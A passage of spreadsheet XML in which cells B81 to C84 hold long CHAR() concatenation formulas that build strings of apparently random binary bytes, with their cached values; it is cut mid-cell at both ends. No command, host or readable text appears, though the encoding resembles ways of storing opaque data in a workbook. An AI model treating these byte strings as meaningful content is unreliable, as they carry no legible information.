        <f>CHAR(166)&amp;CHAR(24)&amp;CHAR(211)&amp;CHAR(167)&amp;CHAR(36)&amp;CHAR(19)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(8)&amp;CHAR(47)&amp;CHAR(155)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(81)&amp;CHAR(60)&amp;CHAR(116)&amp;CHAR(175)&amp;CHAR(138)&amp;CHAR(155)&amp;CHAR(16)&amp;CHAR(182)&amp;CHAR(159)&amp;CHAR(194)&amp;CHAR(170)&amp;CHAR(243)&amp;CHAR(67)&amp;CHAR(62)&amp;CHAR(65)&amp;CHAR(78)&amp;CHAR(225)&amp;CHAR(183)&amp;CHAR(35)&amp;CHAR(66)&amp;CHAR(245)&amp;CHAR(180)&amp;CHAR(180)&amp;CHAR(25)&amp;CHAR(58)&amp;CHAR(253)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(187)&amp;CHAR(59)&amp;CHAR(184)&amp;CHAR(139)&amp;CHAR(190)&amp;CHAR(118)&amp;CHAR(229)&amp;CHAR(21)&amp;CHAR(69)&amp;CHAR(69)&amp;CHAR(68)&amp;CHAR(80)&amp;CHAR(160)&amp;CHAR(91)&amp;CHAR(213)&amp;CHAR(15)&amp;CHAR(229)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(149)&amp;CHAR(8)&amp;CHAR(12)&amp;CHAR(40)&amp;CHAR(103)&amp;CHAR(39)&amp;CHAR(244)&amp;CHAR(228)&amp;CHAR(125)&amp;CHAR(44)&amp;CHAR(209)&amp;CHAR(8)&amp;CHAR(115)&amp;CHAR(17)&amp;CHAR(211)&amp;CHAR(8)&amp;CHAR(222)&amp;CHAR(169)&amp;CHAR(84)&amp;CHAR(190)&amp;CHAR(169)&amp;CHAR(156)&amp;CHAR(187)&amp;CHAR(11)&amp;CHAR(170)&amp;CHAR(67)&amp;CHAR(217)&amp;CHAR(128)&amp;CHAR(217)&amp;CHAR(99)&amp;CHAR(43)&amp;CHAR(186)&amp;CHAR(165)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(96)&amp;CHAR(1)&amp;CHAR(100)&amp;CHAR(88)&amp;CHAR(63)&amp;CHAR(28)&amp;CHAR(237)&amp;CHAR(109)&amp;CHAR(205)&amp;CHAR(187)&amp;CHAR(179)&amp;CHAR(30)&amp;CHAR(68)&amp;CHAR(117)&amp;CHAR(131)&amp;CHAR(174)&amp;CHAR(60)&amp;CHAR(26)&amp;CHAR(84)&amp;CHAR(253)&amp;CHAR(134)&amp;CHAR(18)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(53)&amp;CHAR(104)&amp;CHAR(44)&amp;CHAR(185)&amp;CHAR(167)&amp;CHAR(42)&amp;CHAR(92)&amp;CHAR(41)&amp;CHAR(181)&amp;CHAR(59)&amp;CHAR(180)&amp;CHAR(249)&amp;CHAR(139)&amp;CHAR(153)&amp;CHAR(228)&amp;CHAR(105)&amp;CHAR(55)&amp;CHAR(86)&amp;CHAR(219)&amp;CHAR(230)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(160)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(76)&amp;CHAR(60)&amp;CHAR(200)&amp;CHAR(229)&amp;CHAR(5)&amp;CHAR(220)&amp;CHAR(40)&amp;CHAR(183)&amp;CHAR(43)&amp;CHAR(123)&amp;CHAR(231)&amp;CHAR(96)&amp;CHAR(30)&amp;CHAR(89)&amp;CHAR(245)&amp;CHAR(211)&amp;CHAR(41)&amp;CHAR(239)&amp;CHAR(116)&amp;CHAR(27)&amp;CHAR(118)&amp;CHAR(88)&amp;CHAR(187)&amp;CHAR(170)&amp;CHAR(54)&amp;CHAR(168)&amp;CHAR(141)&amp;CHAR(198)&amp;CHAR(248)&amp;CHAR(8)&amp;CHAR(93)&amp;CHAR(91)&amp;CHAR(88)&amp;CHAR(115)&amp;CHAR(117)&amp;CHAR(198)&amp;CHAR(14)&amp;CHAR(114)&amp;CHAR(157)&amp;CHAR(100)&amp;CHAR(219)&amp;CHAR(62)&amp;CHAR(33)&amp;CHAR(98)&amp;CHAR(105)&amp;CHAR(218)&amp;CHAR(45)&amp;CHAR(231)&amp;CHAR(195)&amp;CHAR(5)&amp;CHAR(200)&amp;CHAR(212)&amp;CHAR(148)&amp;CHAR(38)&amp;CHAR(155)&amp;CHAR(210)&amp;CHAR(221)&amp;CHAR(26)&amp;CHAR(41)&amp;CHAR(117)&amp;CHAR(254)&amp;CHAR(138)&amp;CHAR(209)&amp;CHAR(181)&amp;CHAR(161)&amp;CHAR(80)&amp;CHAR(65)&amp;CHAR(233)&amp;CHAR(173)&amp;CHAR(175)&amp;CHAR(205)&amp;CHAR(178)&amp;CHAR(155)&amp;CHAR(103)&amp;CHAR(151)&amp;CHAR(167)&amp;CHAR(62)&amp;CHAR(251)&amp;CHAR(97)&amp;CHAR(101)&amp;CHAR(194)&amp;CHAR(33)&amp;CHAR(28)&amp;CHAR(198)&amp;CHAR(206)&amp;CHAR(171)&amp;CHAR(121)&amp;CHAR(165)&amp;CHAR(190)&amp;CHAR(105)&amp;CHAR(78)&amp;CHAR(214)&amp;CHAR(239)&amp;CHAR(186)&amp;CHAR(201)&amp;CHAR(160)&amp;CHAR(86)&amp;CHAR(24)&amp;CHAR(168)&amp;CHAR(12)&amp;CHAR(161)&amp;CHAR(174)&amp;CHAR(120)&amp;CHAR(62)&amp;CHAR(1)&amp;CHAR(41)&amp;CHAR(78)&amp;CHAR(160)&amp;CHAR(66)&amp;CHAR(101)</f>
        <v>¦_x0018_Ó§$_x0013_®ú_x0008_/›_x0016__x0004_Q&lt;t¯Š›_x0010_¶ŸÂªóC&gt;ANá·#Bõ´´_x0019_:ýµ†Ê»;¸‹¾vå_x0015_EEDP [Õ_x000F_å_x0013_`•_x0008__x000C_(g'ôä},Ñ_x0008_s_x0011_Ó_x0008_Þ©T¾©œ»_x000B_ªCÙ€Ùc+º¥!_x001A_`_x0001_dX?_x001C_ímÍ»³_x001E_Duƒ®&lt;_x001A_Tý†_x0012_E&amp;5h,¹§*\)µ;´ù‹™äi7VÛæ_x0002_‡ _x0007_ŽL&lt;Èå_x0005_Ü(·+{ç`_x001E_YõÓ)ït_x001B_vX»ª6¨Æø_x0008_][XsuÆ_x000E_rdÛ&gt;!biÚ-çÃ_x0005_ÈÔ”&amp;›ÒÝ_x001A_)uþŠÑµ¡PAé­¯Í²›g—§&gt;ûaeÂ!_x001C_ÆÎ«y¥¾iNÖïºÉ V_x0018_¨_x000C_¡®x&gt;_x0001_)N Be</v>
      </c>
      <c r="C81" t="str">
        <f>CHAR(187)&amp;CHAR(81)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(171)&amp;CHAR(82)&amp;CHAR(170)&amp;CHAR(235)</f>
        <v>»Qöýô6«Rªë</v>
      </c>
    </row>
    <row r="82" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B82" t="str">
        <f>CHAR(24)&amp;CHAR(163)&amp;CHAR(173)&amp;CHAR(169)&amp;CHAR(111)&amp;CHAR(220)&amp;CHAR(235)&amp;CHAR(73)&amp;CHAR(170)&amp;CHAR(110)&amp;CHAR(157)&amp;CHAR(245)&amp;CHAR(221)&amp;CHAR(84)&amp;CHAR(174)&amp;CHAR(208)&amp;CHAR(130)&amp;CHAR(107)&amp;CHAR(81)&amp;CHAR(48)&amp;CHAR(15)&amp;CHAR(148)&amp;CHAR(148)&amp;CHAR(23)&amp;CHAR(237)&amp;CHAR(246)&amp;CHAR(226)&amp;CHAR(68)&amp;CHAR(23)&amp;CHAR(217)&amp;CHAR(230)&amp;CHAR(5)&amp;CHAR(54)&amp;CHAR(105)&amp;CHAR(70)&amp;CHAR(143)&amp;CHAR(19)&amp;CHAR(29)&amp;CHAR(227)&amp;CHAR(16)&amp;CHAR(155)&amp;CHAR(198)&amp;CHAR(146)&amp;CHAR(253)&amp;CHAR(177)&amp;CHAR(109)&amp;CHAR(244)&amp;CHAR(57)&amp;CHAR(28)&amp;CHAR(161)&amp;CHAR(171)&amp;CHAR(163)&amp;CHAR(111)&amp;CHAR(46)&amp;CHAR(139)&amp;CHAR(101)&amp;CHAR(53)&amp;CHAR(61)&amp;CHAR(88)&amp;CHAR(42)&amp;CHAR(240)&amp;CHAR(14)&amp;CHAR(153)&amp;CHAR(239)&amp;CHAR(133)&amp;CHAR(240)&amp;CHAR(160)&amp;CHAR(166)&amp;CHAR(130)&amp;CHAR(228)&amp;CHAR(6)&amp;CHAR(204)&amp;CHAR(30)&amp;CHAR(254)&amp;CHAR(157)&amp;CHAR(242)&amp;CHAR(77)&amp;CHAR(185)&amp;CHAR(15)&amp;CHAR(120)&amp;CHAR(135)&amp;CHAR(96)&amp;CHAR(218)&amp;CHAR(152)&amp;CHAR(167)&amp;CHAR(47)&amp;CHAR(57)&amp;CHAR(202)&amp;CHAR(175)&amp;CHAR(78)&amp;CHAR(27)&amp;CHAR(172)&amp;CHAR(213)&amp;CHAR(79)&amp;CHAR(118)&amp;CHAR(208)&amp;CHAR(171)&amp;CHAR(58)&amp;CHAR(248)&amp;CHAR(129)&amp;CHAR(235)&amp;CHAR(253)&amp;CHAR(95)&amp;CHAR(100)&amp;CHAR(21)&amp;CHAR(39)&amp;CHAR(107)&amp;CHAR(153)&amp;CHAR(202)&amp;CHAR(22)&amp;CHAR(46)&amp;CHAR(42)&amp;CHAR(253)&amp;CHAR(120)&amp;CHAR(51)&amp;CHAR(22)&amp;CHAR(145)&amp;CHAR(110)&amp;CHAR(93)&amp;CHAR(49)&amp;CHAR(248)&amp;CHAR(112)&amp;CHAR(73)&amp;CHAR(6)&amp;CHAR(7)&amp;CHAR(59)&amp;CHAR(44)&amp;CHAR(4)&amp;CHAR(8)&amp;CHAR(112)&amp;CHAR(142)&amp;CHAR(144)&amp;CHAR(209)&amp;CHAR(162)&amp;CHAR(214)&amp;CHAR(151)&amp;CHAR(153)&amp;CHAR(203)&amp;CHAR(119)&amp;CHAR(181)&amp;CHAR(82)&amp;CHAR(124)&amp;CHAR(124)&amp;CHAR(82)&amp;CHAR(134)&amp;CHAR(71)&amp;CHAR(102)&amp;CHAR(249)&amp;CHAR(46)&amp;CHAR(228)&amp;CHAR(255)&amp;CHAR(42)&amp;CHAR(14)&amp;CHAR(128)&amp;CHAR(117)&amp;CHAR(28)&amp;CHAR(101)&amp;CHAR(79)&amp;CHAR(235)&amp;CHAR(51)&amp;CHAR(92)&amp;CHAR(27)&amp;CHAR(212)&amp;CHAR(153)&amp;CHAR(97)&amp;CHAR(81)&amp;CHAR(180)&amp;CHAR(177)&amp;CHAR(59)&amp;CHAR(243)&amp;CHAR(249)&amp;CHAR(16)&amp;CHAR(251)&amp;CHAR(241)&amp;CHAR(151)&amp;CHAR(163)&amp;CHAR(130)&amp;CHAR(144)&amp;CHAR(114)&amp;CHAR(252)&amp;CHAR(78)&amp;CHAR(54)&amp;CHAR(210)&amp;CHAR(202)&amp;CHAR(9)&amp;CHAR(134)&amp;CHAR(1)&amp;CHAR(190)&amp;CHAR(154)&amp;CHAR(71)&amp;CHAR(63)&amp;CHAR(186)&amp;CHAR(99)&amp;CHAR(37)&amp;CHAR(251)&amp;CHAR(252)&amp;CHAR(57)&amp;CHAR(36)&amp;CHAR(111)&amp;CHAR(178)&amp;CHAR(25)&amp;CHAR(30)&amp;CHAR(86)&amp;CHAR(5)&amp;CHAR(109)&amp;CHAR(170)&amp;CHAR(83)&amp;CHAR(209)&amp;CHAR(12)&amp;CHAR(171)&amp;CHAR(188)&amp;CHAR(59)&amp;CHAR(29)&amp;CHAR(105)&amp;CHAR(56)&amp;CHAR(219)&amp;CHAR(224)&amp;CHAR(178)&amp;CHAR(93)&amp;CHAR(201)&amp;CHAR(220)&amp;CHAR(243)&amp;CHAR(88)&amp;CHAR(199)&amp;CHAR(112)&amp;CHAR(112)&amp;CHAR(198)&amp;CHAR(99)&amp;CHAR(88)&amp;CHAR(124)&amp;CHAR(173)&amp;CHAR(146)&amp;CHAR(181)&amp;CHAR(66)&amp;CHAR(156)&amp;CHAR(144)&amp;CHAR(242)&amp;CHAR(38)&amp;CHAR(46)&amp;CHAR(230)&amp;CHAR(32)&amp;CHAR(121)&amp;CHAR(144)&amp;CHAR(41)&amp;CHAR(230)&amp;CHAR(246)&amp;CHAR(172)&amp;CHAR(166)&amp;CHAR(196)&amp;CHAR(195)&amp;CHAR(238)&amp;CHAR(243)&amp;CHAR(180)&amp;CHAR(3)&amp;CHAR(2)</f>
        <v>_x0018_£­©oÜëIªnõÝT®Ð‚kQ0_x000F_””_x0017_íöâD_x0017_Ùæ_x0005_6iF_x0013__x001D_ã_x0010_›Æ’ý±mô9_x001C_¡«£o.‹e5=X*ð_x000E_™ï…ð ¦‚ä_x0006_Ì_x001E_þòM¹_x000F_x‡`Ú˜§/9Ê¯N_x001B_¬ÕOvÐ«:øëý_d_x0015_'k™Ê_x0016_.*ýx3_x0016_‘n]1øpI_x0006__x0007_;,_x0004__x0008_pŽÑ¢Ö—™ËwµR||R†Gfù.äÿ*_x000E_€u_x001C_eOë3\_x001B_Ô™aQ´±;óù_x0010_ûñ—£‚rüN6ÒÊ	†_x0001_¾šG?ºc%ûü9$o²_x0019__x001E_V_x0005_mªSÑ_x000C_«¼;_x001D_i8Ûà²]ÉÜóXÇppÆcX|­’µBœò&amp;.æ y)æö¬¦ÄÃîó´_x0003__x0002_</v>
      </c>
      <c r="C82" t="str">
        <f>CHAR(146)&amp;CHAR(181)&amp;CHAR(127)&amp;CHAR(2)&amp;CHAR(232)&amp;CHAR(195)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(2)</f>
        <v>’µ_x0002_èÃ»ë÷_x0002_</v>
      </c>
    </row>
    <row r="83" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B83" t="str">
        <f>CHAR(6)&amp;CHAR(52)&amp;CHAR(148)&amp;CHAR(242)&amp;CHAR(49)&amp;CHAR(227)&amp;CHAR(43)&amp;CHAR(133)&amp;CHAR(206)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(101)&amp;CHAR(234)&amp;CHAR(84)&amp;CHAR(146)&amp;CHAR(8)&amp;CHAR(227)&amp;CHAR(17)&amp;CHAR(209)&amp;CHAR(165)&amp;CHAR(84)&amp;CHAR(43)&amp;CHAR(115)&amp;CHAR(235)&amp;CHAR(185)&amp;CHAR(162)&amp;CHAR(237)&amp;CHAR(167)&amp;CHAR(18)&amp;CHAR(101)&amp;CHAR(189)&amp;CHAR(140)&amp;CHAR(106)&amp;CHAR(135)&amp;CHAR(13)&amp;CHAR(15)&amp;CHAR(201)&amp;CHAR(243)&amp;CHAR(57)&amp;CHAR(243)&amp;CHAR(57)&amp;CHAR(130)&amp;CHAR(27)&amp;CHAR(249)&amp;CHAR(197)&amp;CHAR(118)&amp;CHAR(60)&amp;CHAR(101)&amp;CHAR(238)&amp;CHAR(22)&amp;CHAR(173)&amp;CHAR(237)&amp;CHAR(3)&amp;CHAR(186)&amp;CHAR(18)&amp;CHAR(35)&amp;CHAR(189)&amp;CHAR(100)&amp;CHAR(177)&amp;CHAR(61)&amp;CHAR(208)&amp;CHAR(228)&amp;CHAR(160)&amp;CHAR(114)&amp;CHAR(86)&amp;CHAR(248)&amp;CHAR(45)&amp;CHAR(179)&amp;CHAR(117)&amp;CHAR(112)&amp;CHAR(158)&amp;CHAR(15)&amp;CHAR(249)&amp;CHAR(8)&amp;CHAR(169)&amp;CHAR(29)&amp;CHAR(34)&amp;CHAR(249)&amp;CHAR(56)&amp;CHAR(196)&amp;CHAR(76)&amp;CHAR(221)&amp;CHAR(32)&amp;CHAR(8)&amp;CHAR(241)&amp;CHAR(56)&amp;CHAR(179)&amp;CHAR(130)&amp;CHAR(162)&amp;CHAR(131)&amp;CHAR(114)&amp;CHAR(221)&amp;CHAR(142)&amp;CHAR(232)&amp;CHAR(30)&amp;CHAR(118)&amp;CHAR(172)&amp;CHAR(184)&amp;CHAR(211)&amp;CHAR(248)&amp;CHAR(78)&amp;CHAR(232)&amp;CHAR(133)&amp;CHAR(238)&amp;CHAR(44)&amp;CHAR(76)&amp;CHAR(46)&amp;CHAR(34)&amp;CHAR(64)&amp;CHAR(252)&amp;CHAR(240)&amp;CHAR(183)&amp;CHAR(68)&amp;CHAR(253)&amp;CHAR(174)&amp;CHAR(128)&amp;CHAR(64)&amp;CHAR(185)&amp;CHAR(222)&amp;CHAR(136)&amp;CHAR(216)&amp;CHAR(134)&amp;CHAR(147)&amp;CHAR(34)&amp;CHAR(45)&amp;CHAR(162)&amp;CHAR(128)&amp;CHAR(57)&amp;CHAR(145)&amp;CHAR(40)&amp;CHAR(15)&amp;CHAR(203)&amp;CHAR(187)&amp;CHAR(21)&amp;CHAR(225)&amp;CHAR(255)&amp;CHAR(51)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(190)&amp;CHAR(119)&amp;CHAR(194)&amp;CHAR(15)&amp;CHAR(54)&amp;CHAR(46)&amp;CHAR(214)&amp;CHAR(89)&amp;CHAR(174)&amp;CHAR(124)&amp;CHAR(108)&amp;CHAR(13)&amp;CHAR(4)&amp;CHAR(181)&amp;CHAR(114)&amp;CHAR(215)&amp;CHAR(66)&amp;CHAR(48)&amp;CHAR(49)&amp;CHAR(155)&amp;CHAR(213)&amp;CHAR(146)&amp;CHAR(94)&amp;CHAR(243)&amp;CHAR(8)&amp;CHAR(109)&amp;CHAR(24)&amp;CHAR(81)&amp;CHAR(52)&amp;CHAR(52)&amp;CHAR(171)&amp;CHAR(246)&amp;CHAR(17)&amp;CHAR(167)&amp;CHAR(117)&amp;CHAR(191)&amp;CHAR(167)&amp;CHAR(56)&amp;CHAR(8)&amp;CHAR(6)&amp;CHAR(6)&amp;CHAR(132)&amp;CHAR(68)&amp;CHAR(204)&amp;CHAR(144)&amp;CHAR(145)&amp;CHAR(91)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(54)&amp;CHAR(181)&amp;CHAR(205)&amp;CHAR(247)&amp;CHAR(242)&amp;CHAR(24)&amp;CHAR(194)&amp;CHAR(22)&amp;CHAR(175)&amp;CHAR(108)&amp;CHAR(123)&amp;CHAR(130)&amp;CHAR(154)&amp;CHAR(125)&amp;CHAR(105)&amp;CHAR(182)&amp;CHAR(88)&amp;CHAR(144)&amp;CHAR(206)&amp;CHAR(8)&amp;CHAR(146)&amp;CHAR(88)&amp;CHAR(83)&amp;CHAR(56)&amp;CHAR(237)&amp;CHAR(39)&amp;CHAR(129)&amp;CHAR(9)&amp;CHAR(138)&amp;CHAR(12)&amp;CHAR(118)&amp;CHAR(196)&amp;CHAR(244)&amp;CHAR(51)&amp;CHAR(29)&amp;CHAR(203)&amp;CHAR(139)&amp;CHAR(218)&amp;CHAR(69)&amp;CHAR(149)&amp;CHAR(110)&amp;CHAR(5)&amp;CHAR(101)&amp;CHAR(11)&amp;CHAR(138)&amp;CHAR(231)&amp;CHAR(170)&amp;CHAR(18)&amp;CHAR(14)&amp;CHAR(225)&amp;CHAR(187)&amp;CHAR(109)&amp;CHAR(178)&amp;CHAR(117)&amp;CHAR(244)&amp;CHAR(45)&amp;CHAR(61)&amp;CHAR(215)&amp;CHAR(14)&amp;CHAR(254)&amp;CHAR(16)&amp;CHAR(56)&amp;CHAR(10)&amp;CHAR(107)&amp;CHAR(59)&amp;CHAR(202)&amp;CHAR(12)</f>
        <v>_x0006_4”ò1ã+…ÎC_x000D_eêT’_x0008_ã_x0011_Ñ¥T+së¹¢í§_x0012_e½Œj‡_x000D__x000F_Éó9ó9‚_x001B_ùÅv&lt;eî_x0016_­í_x0003_º_x0012_#½d±=Ðä rVø-³upž_x000F_ù_x0008_©_x001D_"ù8ÄLÝ _x0008_ñ8³‚¢ƒrÝŽè_x001E_v¬¸ÓøNè…î,L."@üð·Dý®€@¹ÞˆØ†“"-¢€9‘(_x000F_Ë»_x0015_áÿ3žI¾wÂ_x000F_6.ÖY®|l_x000D__x0004_µr×B01›Õ’^ó_x0008_m_x0018_Q44«ö_x0011_§u¿§8_x0008__x0006__x0006_„DÌ‘[_x0017__x0006_6µÍ÷ò_x0018_Â_x0016_¯l{‚š}i¶XÎ_x0008_’XS8í'	Š_x000C_vÄô3_x001D_Ë‹ÚE•n_x0005_e_x000B_Šçª_x0012__x000E_á»m²uô-=×_x000E_þ_x0010_8
k;Ê_x000C_</v>
      </c>
      <c r="C83" t="str">
        <f>CHAR(162)&amp;CHAR(30)&amp;CHAR(72)&amp;CHAR(43)&amp;CHAR(180)&amp;CHAR(111)&amp;CHAR(244)&amp;CHAR(255)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>¢_x001E_H+´oôÿô6</v>
      </c>
    </row>
    <row r="84" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B84" t="str">
        <f>CHAR(253)&amp;CHAR(152)&amp;CHAR(222)&amp;CHAR(104)&amp;CHAR(84)&amp;CHAR(14)&amp;CHAR(232)&amp;CHAR(171)&amp;CHAR(168)&amp;CHAR(42)&amp;CHAR(113)&amp;CHAR(160)&amp;CHAR(71)&amp;CHAR(173)&amp;CHAR(52)&amp;CHAR(168)&amp;CHAR(246)&amp;CHAR(53)&amp;CHAR(5)&amp;CHAR(201)&amp;CHAR(134)&amp;CHAR(130)&amp;CHAR(100)&amp;CHAR(59)&amp;CHAR(127)&amp;CHAR(241)&amp;CHAR(15)&amp;CHAR(93)&amp;CHAR(162)&amp;CHAR(74)&amp;CHAR(225)&amp;CHAR(247)&amp;CHAR(244)&amp;CHAR(70)&amp;CHAR(61)&amp;CHAR(130)&amp;CHAR(177)&amp;CHAR(104)&amp;CHAR(20)&amp;CHAR(24)&amp;CHAR(92)&amp;CHAR(104)&amp;CHAR(201)&amp;CHAR(149)&amp;CHAR(72)&amp;CHAR(186)&amp;CHAR(83)&amp;CHAR(206)&amp;CHAR(221)&amp;CHAR(238)&amp;CHAR(122)&amp;CHAR(173)&amp;CHAR(200)&amp;CHAR(202)&amp;CHAR(25)&amp;CHAR(130)&amp;CHAR(239)&amp;CHAR(210)&amp;CHAR(255)&amp;CHAR(109)&amp;CHAR(115)&amp;CHAR(204)&amp;CHAR(217)&amp;CHAR(94)&amp;CHAR(120)&amp;CHAR(175)&amp;CHAR(204)&amp;CHAR(142)&amp;CHAR(21)&amp;CHAR(113)&amp;CHAR(2)&amp;CHAR(251)&amp;CHAR(90)&amp;CHAR(21)&amp;CHAR(100)&amp;CHAR(226)&amp;CHAR(41)&amp;CHAR(249)&amp;CHAR(78)&amp;CHAR(48)&amp;CHAR(199)&amp;CHAR(22)&amp;CHAR(133)&amp;CHAR(122)&amp;CHAR(254)&amp;CHAR(211)&amp;CHAR(255)&amp;CHAR(180)&amp;CHAR(242)&amp;CHAR(177)&amp;CHAR(199)&amp;CHAR(236)&amp;CHAR(95)&amp;CHAR(163)&amp;CHAR(79)&amp;CHAR(101)&amp;CHAR(203)&amp;CHAR(45)&amp;CHAR(107)&amp;CHAR(99)&amp;CHAR(200)&amp;CHAR(18)&amp;CHAR(12)&amp;CHAR(126)&amp;CHAR(100)&amp;CHAR(127)&amp;CHAR(71)&amp;CHAR(227)&amp;CHAR(202)&amp;CHAR(245)&amp;CHAR(78)&amp;CHAR(122)&amp;CHAR(203)&amp;CHAR(241)&amp;CHAR(202)&amp;CHAR(193)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(43)&amp;CHAR(199)&amp;CHAR(231)&amp;CHAR(100)&amp;CHAR(2)&amp;CHAR(188)&amp;CHAR(116)&amp;CHAR(37)&amp;CHAR(6)&amp;CHAR(253)&amp;CHAR(231)&amp;CHAR(223)&amp;CHAR(193)&amp;CHAR(189)&amp;CHAR(112)&amp;CHAR(192)&amp;CHAR(147)&amp;CHAR(107)&amp;CHAR(58)&amp;CHAR(178)&amp;CHAR(48)&amp;CHAR(106)&amp;CHAR(50)&amp;CHAR(246)&amp;CHAR(223)&amp;CHAR(163)&amp;CHAR(160)&amp;CHAR(64)&amp;CHAR(104)&amp;CHAR(37)&amp;CHAR(167)&amp;CHAR(135)&amp;CHAR(119)&amp;CHAR(243)&amp;CHAR(206)&amp;CHAR(185)&amp;CHAR(20)&amp;CHAR(79)&amp;CHAR(239)&amp;CHAR(167)&amp;CHAR(228)&amp;CHAR(61)&amp;CHAR(211)&amp;CHAR(199)&amp;CHAR(122)&amp;CHAR(29)&amp;CHAR(105)&amp;CHAR(13)&amp;CHAR(18)&amp;CHAR(173)&amp;CHAR(65)&amp;CHAR(8)&amp;CHAR(142)&amp;CHAR(90)&amp;CHAR(197)&amp;CHAR(17)&amp;CHAR(196)&amp;CHAR(43)&amp;CHAR(221)&amp;CHAR(204)&amp;CHAR(142)&amp;CHAR(30)&amp;CHAR(30)&amp;CHAR(129)&amp;CHAR(33)&amp;CHAR(99)&amp;CHAR(30)&amp;CHAR(178)&amp;CHAR(247)&amp;CHAR(241)&amp;CHAR(196)&amp;CHAR(142)&amp;CHAR(211)&amp;CHAR(55)&amp;CHAR(98)&amp;CHAR(37)&amp;CHAR(68)&amp;CHAR(48)&amp;CHAR(190)&amp;CHAR(77)&amp;CHAR(161)&amp;CHAR(32)&amp;CHAR(32)&amp;CHAR(143)&amp;CHAR(45)&amp;CHAR(26)&amp;CHAR(140)&amp;CHAR(205)&amp;CHAR(226)&amp;CHAR(6)&amp;CHAR(24)&amp;CHAR(71)&amp;CHAR(21)&amp;CHAR(51)&amp;CHAR(239)&amp;CHAR(144)&amp;CHAR(157)&amp;CHAR(245)&amp;CHAR(246)&amp;CHAR(39)&amp;CHAR(210)&amp;CHAR(207)&amp;CHAR(31)&amp;CHAR(252)&amp;CHAR(155)&amp;CHAR(60)&amp;CHAR(11)&amp;CHAR(158)&amp;CHAR(248)&amp;CHAR(196)&amp;CHAR(112)&amp;CHAR(160)&amp;CHAR(236)&amp;CHAR(235)&amp;CHAR(20)&amp;CHAR(15)&amp;CHAR(112)&amp;CHAR(52)&amp;CHAR(59)&amp;CHAR(129)&amp;CHAR(224)&amp;CHAR(87)&amp;CHAR(56)&amp;CHAR(104)&amp;CHAR(44)&amp;CHAR(141)&amp;CHAR(42)&amp;CHAR(227)&amp;CHAR(68)&amp;CHAR(128)&amp;CHAR(187)&amp;CHAR(39)&amp;CHAR(134)&amp;CHAR(192)&amp;CHAR(105)&amp;CHAR(142)&amp;CHAR(54)</f>
        <v>ý˜ÞhT_x000E_è«¨*q G­4¨ö5_x0005_É†‚d;ñ_x000F_]¢Já÷ôF=‚±h_x0014__x0018_\hÉ•HºSÎÝîz­ÈÊ_x0019_‚ïÒÿmsÌÙ^x¯ÌŽ_x0015_q_x0002_ûZ_x0015_dâ)ùN0Ç_x0016_…zþÓÿ´ò±Çì_£OeË-kcÈ_x0012__x000C_~dGãÊõNzËñÊÁ_x0002_
+Ççd_x0002_¼t%_x0006_ýçßÁ½pÀ“k:²0j2öß£ @h%§‡wóÎ¹_x0014_Oï§ä=ÓÇz_x001D_i_x000D__x0012_­A_x0008_ŽZÅ_x0011_Ä+ÝÌŽ_x001E__x001E_!c_x001E_²÷ñÄŽÓ7b%D0¾M¡  -_x001A_ŒÍâ_x0006__x0018_G_x0015_3ïõö'ÒÏ_x001F_ü›&lt;_x000B_žøÄp ìë_x0014__x000F_p4;àW8h,*ãD€»'†ÀiŽ6</v>
      </c>
      <c r="C84" t="str">
        <f>CHAR(168)&amp;CHAR(163)&amp;CHAR(48)&amp;CHAR(223)&amp;CHAR(210)&amp;CHAR(213)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(163)</f>
        <v>¨£0ßÒÕô6Í£</v>
      </c>
    </row>
    <row r="85" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B85" t="str">
        <f>CHAR(39)&amp;CHAR(194)&amp;CHAR(57)&amp;CHAR(236)&amp;CHAR(206)&amp;CHAR(134)&amp;CHAR(139)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(195)&amp;CHAR(223)&amp;CHAR(205)&amp;CHAR(177)&amp;CHAR(194)&amp;CHAR(197)&amp;CHAR(135)&amp;CHAR(3)&amp;CHAR(124)&amp;CHAR(216)&amp;CHAR(122)&amp;CHAR(48)&amp;CHAR(193)&amp;CHAR(52)&amp;CHAR(53)&amp;CHAR(90)&amp;CHAR(89)&amp;CHAR(13)&amp;CHAR(120)&amp;CHAR(60)&amp;CHAR(26)&amp;CHAR(245)&amp;CHAR(35)&amp;CHAR(166)&amp;CHAR(77)&amp;CHAR(243)&amp;CHAR(221)&amp;CHAR(9)&amp;CHAR(213)&amp;CHAR(235)&amp;CHAR(124)&amp;CHAR(200)&amp;CHAR(222)&amp;CHAR(200)&amp;CHAR(20)&amp;CHAR(76)&amp;CHAR(84)&amp;CHAR(235)&amp;CHAR(96)&amp;CHAR(136)&amp;CHAR(220)&amp;CHAR(156)&amp;CHAR(109)&amp;CHAR(134)&amp;CHAR(222)&amp;CHAR(225)&amp;CHAR(236)&amp;CHAR(2)&amp;CHAR(186)&amp;CHAR(175)&amp;CHAR(139)&amp;CHAR(67)&amp;CHAR(69)&amp;CHAR(157)&amp;CHAR(194)&amp;CHAR(205)&amp;CHAR(48)&amp;CHAR(164)&amp;CHAR(104)&amp;CHAR(228)&amp;CHAR(51)&amp;CHAR(244)&amp;CHAR(47)&amp;CHAR(62)&amp;CHAR(252)&amp;CHAR(139)&amp;CHAR(195)&amp;CHAR(207)&amp;CHAR(115)&amp;CHAR(111)&amp;CHAR(12)&amp;CHAR(185)&amp;CHAR(215)&amp;CHAR(29)&amp;CHAR(53)&amp;CHAR(122)&amp;CHAR(204)&amp;CHAR(231)&amp;CHAR(130)&amp